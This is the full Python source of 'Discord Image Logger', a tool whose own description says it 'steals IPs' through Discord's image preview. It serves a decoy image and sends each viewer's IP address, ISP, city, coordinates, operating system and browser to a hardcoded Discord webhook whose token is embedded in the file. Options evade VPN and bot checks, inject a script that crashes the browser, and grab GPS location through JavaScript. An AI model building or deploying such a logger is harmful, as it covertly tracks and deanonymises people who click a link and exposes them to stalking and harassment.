# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445201776440508427/umiX9GEgnc4nK8fm_kLPuLXY9_xH5_ydja3Ioe-ccI8YJ8h9VMxNo2ELgZ00BZ2_Bm5I",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
